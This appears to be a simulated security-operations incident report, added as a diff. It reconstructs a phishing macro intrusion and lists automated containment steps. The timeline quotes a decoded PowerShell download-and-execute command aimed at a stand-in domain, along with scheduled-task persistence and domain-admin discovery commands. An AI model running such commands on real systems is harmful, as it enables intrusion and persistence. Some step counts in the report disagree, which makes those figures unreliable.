@@ -1,0 +1,146 @@
+[SEC-OPS INCIDENT REPORT] - INC-2026-1027-001 / Suspicious PowerShell spawned by WINWORD.EXE on FIN-WS-042
+Severity Assessment: Critical | Confidence Score: 97%
+(risk score 100/100 | source: EDR + Email Gateway | events: 16 | generated 2026-10-28T03:41:17Z)
+
+1. Executive Summary & Root Cause
+Between 2026-10-27T09:02:14Z and 2026-10-27T09:16:30Z, host FIN-WS-042 and account CORP\jdoe produced 10 detections spanning 6 ATT&CK tactics (Initial Access, Execution, Persistence, Defense Evasion, Discovery, Command and Control). Root cause: a phishing email carrying a malicious attachment or link reached jdoe and a user opened it (first seen 2026-10-27T09:02:14Z, T1566.001). Assessed Critical (risk 100/100) because of active command-and-control; the SOAR playbook runs 12 steps automatically.
+
+2. Threat Intelligence & Entity Enrichment
+Entity 1 (File Hash): 9f1c3b7a52d84e6fa0b1c2d3e4f5061728394a5b6c7d8e9f0a1b2c3d4e5f6a7b
+    [MALICIOUS | score 95] VirusTotal (simulated): 58/72 engines flag this hash | Family: Cobalt Strike Beacon (simulated sample) (backdoor / C2 implant) | First seen 2026-08-14 | MISP: SIM-EVT-2026-0412 | cluster: SimActor-7 (fictional)
+Entity 2 (File Hash): d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2
+    [MALICIOUS | score 95] VirusTotal (simulated): 47/72 engines flag this hash | Family: Malicious Office macro dropper (simulated sample) (document dropper) | First seen 2026-10-20 | MISP: SIM-EVT-2026-0910 | cluster: SimActor-7 (fictional)
+Entity 3 (IP Address): 203.0.113.45
+    [MALICIOUS | score 94] Reputation (simulated): malicious (score 94/100) | Geo: RU | AS64496 ExampleHost LLC (fictional) | Role: c2 | MISP: SIM-EVT-2026-0412 | cluster: SimActor-7 (fictional) | Seen in 214 events across feeds
+Entity 4 (Domain): cdn-update-check.example
+    [MALICIOUS | score 91] Domain reputation (simulated): malicious (score 91/100) | Role: c2 | Registered: 2026-10-19 (9 days old) | Resolves to 203.0.113.45 | MISP: SIM-EVT-2026-0412 | cluster: SimActor-7 (fictional)
+Entity 5 (Host (CMDB)): FIN-WS-042
+    [INFO | score 10] CMDB (simulated): workstation, Windows 11 Pro, criticality MEDIUM, owner jdoe
+Entity 6 (User Account (AD/IdP)): CORP\jdoe
+    [INFO | score 5] AD/IdP (simulated): John Doe, Finance | usual sign-in countries: IN | no risk flags
+
+3. Reconstructed Incident Timeline
+`[2026-10-27T09:02:14Z]` -> Email from billing@invoice-portal-login.example to jdoe@corp.example delivered with attachment 'Invoice_88213.docm' (subject: 'Overdue invoice #88213 - action required') -> Execution / T1204.002 User Execution: Malicious File; Initial Access / T1566.001 Phishing: Spearphishing Attachment
+`[2026-10-27T09:10:50Z]` -> File activity on FIN-WS-042: file_create C:\Users\jdoe\Downloads\Invoice_88213.docm -> Execution / T1204.002 User Execution: Malicious File
+`[2026-10-27T09:11:03Z]` -> explorer.exe started winword.exe on FIN-WS-042 as CORP\jdoe: "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" "C:\Users\jdoe\Downloads\Invoice_88213.docm" -> -
+`[2026-10-27T09:11:21Z]` -> winword.exe started powershell.exe on FIN-WS-042 as CORP\jdoe: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBu... [decoded: IEX (New-Object Net.WebClient).DownloadString('http://cdn-update-check.example/a.ps1')] -> Execution / T1204.002 User Execution: Malicious File; Execution / T1059.001 Command and Scripting Interpreter: PowerShell; Defense Evasion / T1027 Obfuscated Files or Information
+`[2026-10-27T09:11:24Z]` -> FIN-WS-042 -> 203.0.113.45: 6 connections, every ~61s (jitter 5%) (09:11:24 to 09:16:30) -> Command and Control / T1071.001 Application Layer Protocol: Web Protocols; Defense Evasion / T1036.005 Masquerading: Match Legitimate Name or Location
+`[2026-10-27T09:11:40Z]` -> File activity on FIN-WS-042: file_create C:\Users\Public\svchost32.exe -> Execution / T1204.002 User Execution: Malicious File
+`[2026-10-27T09:11:45Z]` -> powershell.exe started svchost32.exe on FIN-WS-042 as CORP\jdoe: C:\Users\Public\svchost32.exe -> Execution / T1204.002 User Execution: Malicious File; Defense Evasion / T1036.005 Masquerading: Match Legitimate Name or Location
+`[2026-10-27T09:14:10Z]` -> svchost32.exe started schtasks.exe on FIN-WS-042 as CORP\jdoe: schtasks.exe /create /tn "WindowsUpdateCheck" /tr C:\Users\Public\svchost32.exe /sc minute /mo 30 /ru SYSTEM -> Persistence / T1053.005 Scheduled Task/Job: Scheduled Task
+`[2026-10-27T09:15:02Z]` -> svchost32.exe started whoami.exe on FIN-WS-042 as CORP\jdoe: whoami /all -> Discovery / T1016 System Network Configuration Discovery; Discovery / T1033 System Owner/User Discovery; Discovery / T1087 Account Discovery
+`[2026-10-27T09:15:20Z]` -> svchost32.exe started net.exe on FIN-WS-042 as CORP\jdoe: net group "Domain Admins" /domain -> Discovery / T1016 System Network Configuration Discovery; Discovery / T1033 System Owner/User Discovery; Discovery / T1087 Account Discovery
+`[2026-10-27T09:15:41Z]` -> svchost32.exe started ipconfig.exe on FIN-WS-042 as CORP\jdoe: ipconfig /all -> Discovery / T1016 System Network Configuration Discovery; Discovery / T1033 System Owner/User Discovery; Discovery / T1087 Account Discovery
+
+ATT&CK tactics observed (kill-chain order): Initial Access > Execution > Persistence > Defense Evasion > Discovery > Command and Control
+Detections triggered:
+  - [critical] Known-malicious file hash observed: Malicious Office macro dropper (simulated sample) (TI-HASH-MALICIOUS)
+      evidence: host?: (Malicious Office macro dropper (simulated sample)) 47/72 engines
+      evidence: FIN-WS-042: C:\Users\jdoe\Downloads\Invoice_88213.docm (Malicious Office macro dropper (simulated sample)) 47/72 engines
+  - [high] Phishing email delivered to a user (INIT-PHISHING-EMAIL)
+      evidence: From billing@invoice-portal-login.example to jdoe@corp.example: risky attachment type .docm; attachment hash is known-malicious
+  - [high] Document application spawned a script interpreter (EXEC-OFFICE-CHILD)
+      evidence: winword.exe spawned powershell.exe on FIN-WS-042
+  - [high] Encoded / obfuscated PowerShell command (EXEC-PS-ENCODED)
+      evidence: FIN-WS-042: encoded PowerShell, decoded: IEX (New-Object Net.WebClient).DownloadString('http://cdn-update-check.example/a.ps1')
+  - [medium] PowerShell launched with stealth / policy-bypass flags (EXEC-PS-STEALTH)
+      evidence: FIN-WS-042: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAF...
+  - [high] Periodic beaconing to the same destination (NET-BEACON)
+      evidence: FIN-WS-042 -> 203.0.113.45: 6 connections, every ~61s (jitter 5%)
+  - [high] Connection to known command-and-control infrastructure (NET-C2)
+      evidence: FIN-WS-042 -> 203.0.113.45:443 (c2)
+      evidence: FIN-WS-042 -> cdn-update-check.example:443 (c2)
+  - [high] Process masquerading as a Windows system binary (EVADE-MASQUERADE)
+      evidence: svchost32.exe runs from C:\Users\Public\svchost32.exe
+  - [high] Scheduled task created for persistence (PERSIST-SCHTASK)
+      evidence: FIN-WS-042: C:\Windows\System32\schtasks.exe schtasks.exe /create /tn "WindowsUpdateCheck" /tr C:\Users\Public\svchost32.exe /sc minute /mo 30 /ru SYSTEM
+  - [medium] Burst of host / account / network discovery commands (DISC-BURST)
+      evidence: FIN-WS-042: 3 discovery techniques within 10 minutes
+
+4. Autonomous SOAR Isolation Playbook
+Mode: SIMULATION | 12 step(s) | 12 auto-executed | 0 held for human approval by safety guardrails
+Step 1: Network Containment -> Isolate host FIN-WS-042 from the network (agent stays connected for triage) [CrowdStrike Falcon]
+        API: GET https://api.crowdstrike.com/devices/queries/devices/v1?filter=hostname:'FIN-WS-042'
+        API: POST https://api.crowdstrike.com/devices/entities/devices-actions/v2?action_name=contain
+             payload: {"ids":["<device_id of FIN-WS-042>"]}
+        Rollback: POST same endpoint with action_name=lift_containment
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 2: Identity Revocation -> Revoke all sign-in sessions and force a password reset for CORP\jdoe [Microsoft Entra ID]
+        API: POST https://graph.microsoft.com/v1.0/users/<UPN of CORP\jdoe>/revokeSignInSessions
+        API: PATCH https://graph.microsoft.com/v1.0/users/<UPN of CORP\jdoe>
+             payload: {"passwordProfile":{"forceChangePasswordNextSignIn":true}}
+        Rollback: n/a (user must re-authenticate; password reset is permanent)
+        Note: Require MFA re-registration.
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 3: Identity Revocation -> Revoke all sign-in sessions and force a password reset for jdoe [Microsoft Entra ID]
+        API: POST https://graph.microsoft.com/v1.0/users/<UPN of jdoe>/revokeSignInSessions
+        API: PATCH https://graph.microsoft.com/v1.0/users/<UPN of jdoe>
+             payload: {"passwordProfile":{"forceChangePasswordNextSignIn":true}}
+        Rollback: n/a (user must re-authenticate; password reset is permanent)
+        Note: Require MFA re-registration.
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 4: Perimeter Block -> Block 1 malicious IP address(es) at the firewall: 203.0.113.45 [Palo Alto PAN-OS]
+        API: POST https://<PAN_FW>/restapi/v10.2/Objects/Addresses?location=vsys&vsys=vsys1&name=SOAR-BLOCK-203.0.113.45
+             payload: {"entry":{"@name":"SOAR-BLOCK-203.0.113.45","ip-netmask":"203.0.113.45/32","description":"SOAR INC-2026-1027-001"}}
+        API: PUT https://<PAN_FW>/restapi/v10.2/Objects/AddressGroups?location=vsys&vsys=vsys1&name=SOAR-Blocklist
+             payload: {"entry":{"@name":"SOAR-Blocklist","static":{"member":["SOAR-BLOCK-203.0.113.45"]}}}
+        API: POST https://<PAN_FW>/api/?type=commit&cmd=<commit></commit>
+        Rollback: Remove the address objects from group SOAR-Blocklist and commit
+        Note: Private/internal addresses and the allow-list in config.json are never blocked.
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 5: Perimeter Block -> Block / sinkhole 1 malicious domain(s): cdn-update-check.example [Palo Alto PAN-OS + DNS]
+        API: PUT https://<PAN_FW>/restapi/v10.2/Objects/CustomURLCategories?location=vsys&vsys=vsys1&name=SOAR-Block-URLs
+             payload: {"entry":{"@name":"SOAR-Block-URLs","type":"URL List","list":{"member":["cdn-update-check.example"]}}}
+        API: POST https://<PAN_FW>/api/?type=commit&cmd=<commit></commit>
+        Rollback: Remove the domains from custom URL category SOAR-Block-URLs and commit
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 6: Endpoint Eradication -> Add 2 malicious file hash(es) to the EDR block list (prevent + remediate) [CrowdStrike Falcon]
+        API: POST https://api.crowdstrike.com/iocs/entities/indicators/v1
+             payload: {"comment":"SOAR INC-2026-1027-001","indicators":[{"type":"sha256","value":"9f1c3b7a52d84e6fa0b1c2d3e4f5061728394a5b6c7d8e9f0a1b2c3d4e5f6a7b","action":"prevent","severity":"high","platforms":["windows"],"applied_globa...
+        Rollback: DELETE https://api.crowdstrike.com/iocs/entities/indicators/v1?ids=<indicator ids>
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 7: Endpoint Eradication -> Terminate process tree and quarantine image: powershell.exe, schtasks.exe, svchost32.exe on FIN-WS-042 [CrowdStrike Falcon]
+        API: POST https://api.crowdstrike.com/real-time-response/combined/batch-active-responder-command/v1
+             payload: {"base_command":"kill","command_string":"kill <PID resolved from process tree: powershell.exe, schtasks.exe, svchost32.exe>","host_ids":["<device_id of FIN-WS-042>"]}
+        API: POST https://api.crowdstrike.com/real-time-response/combined/batch-active-responder-command/v1
+             payload: {"base_command":"rm","command_string":"rm <image path of powershell.exe, schtasks.exe, svchost32.exe> (after copy to quarantine)","host_ids":["<device_id of FIN-WS-042>"]}
+        Rollback: n/a (process termination is not reversible; restore file from quarantine copy)
+        Note: Resolve the PID from the EDR process tree; never kill by image name alone.
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 8: Email Remediation -> Purge the phishing message from all mailboxes and block the sender [Microsoft Purview / Exchange Online]
+        API: PowerShell New-ComplianceSearch -Name "SOAR-purge" -ExchangeLocation CORP\jdoe,jdoe -ContentMatchQuery 'from:"billing@invoice-portal-login.example" AND attachment:"Invoice_88213.docm"'
+             payload: find the message in mailboxes
+        API: PowerShell Start-ComplianceSearch -Identity "SOAR-purge"
+             payload: run search
+        API: PowerShell New-ComplianceSearchAction -SearchName "SOAR-purge" -Purge -PurgeType SoftDelete
+             payload: soft-delete the message everywhere
+        API: PowerShell New-TenantAllowBlockListItems -ListType Sender -Block -Entries "billing@invoice-portal-login.example"
+             payload: block the sender
+        Rollback: Release from quarantine / remove sender block
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 9: Forensic Preservation -> Collect a triage package (processes, network, autoruns, prefetch) from FIN-WS-042 [CrowdStrike Falcon]
+        API: POST https://api.crowdstrike.com/real-time-response/entities/sessions/v1
+             payload: {"device_id":"<device_id of FIN-WS-042>","queue_offline":false}
+        API: POST https://api.crowdstrike.com/real-time-response/entities/active-responder-command/v1
+             payload: {"base_command":"runscript","command_string":"runscript -CloudFile=\"triage_collector\"","session_id":"<session id>"}
+        Rollback: n/a
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 10: Scoping & Hunt -> Hunt for the same indicators on other hosts [Microsoft Sentinel + Splunk]
+        API: KQL DeviceFileEvents | where SHA256 in ("9f1c3b7a52d84e6fa0b1c2d3e4f5061728394a5b6c7d8e9f0a1b2c3d4e5f6a7b", "d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2") | summarize hosts=dcount(DeviceName) by DeviceName
+        API: KQL DeviceNetworkEvents | where RemoteIP in ("203.0.113.45") or RemoteUrl in ("cdn-update-check.example") | summarize count() by DeviceName
+        API: SPL index=* (dest_ip IN (203.0.113.45) OR dest IN (cdn-update-check.example)) | stats count by host, dest
+        Rollback: read-only queries
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 11: Ticketing -> Open a P1 incident ticket with the full report attached [ServiceNow]
+        API: POST https://<instance>.service-now.com/api/now/table/incident
+             payload: {"short_description":"[SecOps CRITICAL] Suspicious PowerShell spawned by WINWORD.EXE on FIN-WS-042","category":"Security","urgency":1,"impact":1,"description":"Alert INC-2026-1027-001 (Suspicious PowerShell spawned by...
+        Rollback: close ticket
+        Status: SIMULATED EXECUTED (no network call was sent)
+Step 12: Notification -> Page the on-call analyst [Slack]
+        API: POST https://slack.com/api/chat.postMessage
+             payload: {"channel":"#soc-incidents","text":"[SecOps CRITICAL] Suspicious PowerShell spawned by WINWORD.EXE on FIN-WS-042: 10 steps auto-run, 0 awaiting approval"}
+        Rollback: n/a
+        Status: SIMULATED EXECUTED (no network call was sent)
+
+---
+SIMULATION: threat intelligence, directory data and SOAR actions are simulated. No API call was sent and nothing was isolated, disabled or blocked.
